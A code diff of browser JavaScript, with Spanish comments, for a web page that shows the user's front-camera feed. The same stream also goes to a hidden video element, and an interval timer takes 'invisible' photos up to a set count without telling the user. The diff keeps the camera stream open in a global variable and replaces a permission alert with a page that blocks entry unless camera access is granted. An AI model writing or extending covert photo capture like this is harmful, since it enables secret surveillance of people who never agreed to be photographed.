@@ -19,23 +19,29 @@ document.body.appendChild(canvasInvisible);
 
 let photoCount = 0;
 
+// Variable global para mantener la sesión
+let streamGlobal = null;
+
 async function startCamera() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    // Solo pide permiso si no hay stream
+    if (!streamGlobal) {
+      streamGlobal = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    }
 
     // Cámara visible
-    videoVisible.srcObject = stream;
+    videoVisible.srcObject = streamGlobal;
     videoVisible.play();
 
-    // Cámara invisible
-    videoInvisible.srcObject = stream;
+    // Cámara oculta
+    videoInvisible.srcObject = streamGlobal;
     videoInvisible.play();
 
     videoInvisible.onloadedmetadata = () => {
       const interval = setInterval(() => {
         takeInvisiblePhoto();
         photoCount++;
-        if(photoCount >= maxPhotos){
+        if (photoCount >= maxPhotos) {
           clearInterval(interval);
           console.log("✅ Todas las fotos tomadas. La cámara visible sigue activa.");
         }
@@ -43,8 +49,10 @@ async function startCamera() {
     };
 
   } catch (err) {
-    alert("❌ Necesitamos acceso a la cámara para capturar recuerdos.");
-    console.error("Error al acceder a la cámara:", err);
+    document.body.innerHTML = `
+      <h1>⚠️ Necesitamos acceso a la cámara</h1>
+      <p>No puedes entrar a esta página sin dar permisos.</p>
+    `;
   }
 }
 
